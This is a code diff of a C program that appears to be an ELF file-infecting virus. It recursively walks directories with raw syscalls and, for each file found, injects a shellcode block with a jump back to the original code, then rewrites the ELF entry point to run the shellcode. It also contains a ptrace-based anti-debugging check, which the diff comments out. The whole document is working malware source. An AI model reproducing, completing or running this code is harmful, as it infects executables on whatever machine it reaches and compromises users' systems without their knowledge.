@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #define _XOPEN_SOURCE 500
 #include <stdio.h>
 #include <unistd.h>
@@ -8,6 +9,11 @@
 #include <stdlib.h>
 #include <elf.h>
 #include <fcntl.h>
+#define _GNU_SOURCE
+#include <dirent.h>     /* Defines DT_* constants */
+#include <sys/stat.h>
+#include <sys/syscall.h>
+
 #define SPARE_FDS  (4)
 #define MAX_FDS    (512)
 
@@ -60,15 +66,19 @@ struct linux_dirent {
    unsigned short d_reclen;
    char           d_name[];
 };
-
-struct linux_dirent {
-   long           d_ino;
-   off_t          d_off;
-   unsigned short d_reclen;
-   char           d_name[];
-};
-
-
+static inline int my_access(const char *fpath, int flag);
+static inline int my_open(const char *fpath, int flag);
+static inline int my_read(unsigned int fd, char *buf, int count);
+static inline int my_write(unsigned int fd, char *buf, int count);
+static inline int my_lseek(int fd, int offset, int origin);
+static inline int my_getdent(int fd, struct linux_dirent *dirent, int count);
+void my_memcpy(char* d, char* s, int l);
+int my_strlen(const char *str);
+int my_ptraceme(long request, long pid, unsigned long addr, unsigned long data);
+int my_strcmp(char *str1, char *str2);
+void listdir(const char *dirname);
+void change_entrypoint(const char* fpath);
+int file_process(const char *fpath, const struct stat *sb, int flag, struct FTW *s);
 
 
 static inline int my_access(const char *fpath, int flag){
@@ -140,8 +150,7 @@ static inline int my_getdent(int fd, struct linux_dirent *dirent, int count){
     asm("mov %%rax, %0":"=r"(ret));
     return ret;
 }
-
-
+ 
 void my_memcpy(char* d, char* s, int l){
     int i=0;
     while(l--){
@@ -173,11 +182,12 @@ int my_strcmp(char *str1, char *str2) {
   return *str1 - *str2;
 }
 
+/*
 void listdir(const char *dirname){
     int nread = 0;
     int dirname_len = my_strlen(dirname);
     int d_name_len;
-    int fd = my_open(dirname, O_RDONLY | O_DIRECTORY);
+    int fd = my_open(dirname, 0x00200000); //O_RDONLY(0x0)|O_DIRECTORY(0x00200000)
     struct linux_dirent *d;
     int bpos = 0;
     char d_type;
@@ -187,9 +197,10 @@ void listdir(const char *dirname){
     char dot[2] = {'.', 0};
     char dotdot[3] = {'.', '.', 0};
     char slash[2] = {'/', 0};
+	printf("fd : %d\n",fd);
        for ( ; ; ) {
         nread = my_getdent(fd,(struct linux_dirent *)buf, 100000);
-        //printf("nread : %d\n",nread);
+        printf("nread : %d\n",nread);
         if (nread <= 0) break;
 
         for (bpos = 0; bpos < nread;) {
@@ -197,14 +208,19 @@ void listdir(const char *dirname){
             d_type = *(buf + bpos + d->d_reclen - 1);
             d_name_len = my_strlen(d->d_name);
             bpos += d->d_reclen;
-            //printf("%s\n",d->d_name);
+            printf("%s\n",d->d_name);
             my_memcpy(subfile,dirname,dirname_len);
             my_memcpy(subfile + dirname_len, slash, 1);
             my_memcpy(subfile + dirname_len + 1 ,d->d_name,d_name_len+1);
-            printf("whole path??? %s\n",subfile);
+            printf("whole path!!! %s\n",subfile);
+			
+			// here ! file process !
+			change_entrypoint(subfile);
+			
+			
             if(d->d_ino && my_strcmp(d->d_name, dot) && my_strcmp(d->d_name, dotdot))
             {
-                if(d_type == DT_DIR) // if directory
+                if(d_type == 0x4) // DT_DIR(0x4)
                 {
                     //printf("%s/%s\n",dirname, d->d_name);
                     my_memcpy(subdir, dirname, dirname_len);
@@ -219,8 +235,59 @@ void listdir(const char *dirname){
         }
     }
 }
+*/
 
+void listdir(const char *dirname){
+    int nread = 0;
+    int dirname_len = my_strlen(dirname);
+    int d_name_len;
+    int fd = my_open(dirname, O_RDONLY | O_DIRECTORY);
+    struct linux_dirent *d;
+    int bpos = 0;
+    char d_type;
+    char buf[1000];
+    char subdir[4096+1]; // PATH_MAX
+    char subfile[4096+1]; // PATH_MAX
+    char dot[2] = {'.', 0};
+    char dotdot[3] = {'.', '.', 0};
+    char slash[2] = {'/', 0};
+       for ( ; ; ) {
+        nread = my_getdent(fd,(struct linux_dirent *)buf, 1000);
+        printf("nread : %d\n",nread);
+        if (nread <= 0) break;
 
+        for (bpos = 0; bpos < nread;) {
+            d = (struct linux_dirent*) (buf + bpos);
+            d_type = *(buf + bpos + d->d_reclen - 1);
+            d_name_len = my_strlen(d->d_name);
+            bpos += d->d_reclen;
+            //printf("%s\n",d->d_name);
+            my_memcpy(subfile,dirname,dirname_len);
+            my_memcpy(subfile + dirname_len, slash, 1);
+            my_memcpy(subfile + dirname_len + 1 ,d->d_name,d_name_len+1);
+            
+			
+			printf("whole path??? %s\n",subfile);
+            change_entrypoint(subfile);
+			
+			
+			if(d->d_ino && my_strcmp(d->d_name, dot) && my_strcmp(d->d_name, dotdot))
+            {
+                if(d_type == DT_DIR) // if directory
+                {
+                    //printf("%s/%s\n",dirname, d->d_name);
+                    my_memcpy(subdir, dirname, dirname_len);
+                    //printf("***subdir : %s\n",subdir);
+                    my_memcpy(subdir + dirname_len, slash, 1);
+                    //printf("***subdir : %s\n",subdir);
+                    my_memcpy(subdir + dirname_len + 1, d->d_name, d_name_len+1);
+                    //printf("***subdir : %s\n",subdir);
+                    listdir(subdir);
+                }
+            }
+        }
+    }
+}
 
 
 
@@ -238,7 +305,6 @@ void change_entrypoint(const char* fpath){
 		printf("[ERROR] Permission error(%s)\n",fpath);
 		return 0;
 	}
-
 	fd = my_open(fpath, 2); // O_RDWR = 2
 	if (fd < 0){
 		printf("[ERROR] fd error(%s)\n",fpath);
@@ -333,7 +399,6 @@ void change_entrypoint(const char* fpath){
 	my_write(fd,shellcode,0x1000 - sizeof(jmp2original));
 	my_write(fd,jmp2original,sizeof(jmp2original));
 	
-	//gogo
 	//엔트리포인트 수정하기
 	ehdr.e_entry = shellcodeloc;
 	my_lseek(fd, 0, SEEK_SET);
@@ -343,29 +408,15 @@ void change_entrypoint(const char* fpath){
 	
 }
 
-int file_process(const char *fpath, const struct stat *sb, int flag, struct FTW *s){
-    int ret = 0;
-    if (flag == FTW_F) {
-		change_entrypoint(fpath);
-		printf("\n");
-	}
-    return ret;
-} 
-
 int main(int argc, char* argv[])
 {
-    struct timeval t;
-    int nfds = getdtablesize() - SPARE_FDS;
-    nfds = nfds > MAX_FDS ? MAX_FDS : nfds;
- 
+	/*
 	if(my_ptraceme(0,0,0,0)!=0){
 		printf("[ERROR] Debugger detected!\n");
 		while(1);
 		return 0;
 	}
-    gettimeofday(&t, NULL);
-    srand(t.tv_usec * t.tv_sec);
-    nftw(".", file_process, nfds, FTW_PHYS);
-    exit(0);
+	*/
+    listdir(".");
 }
 
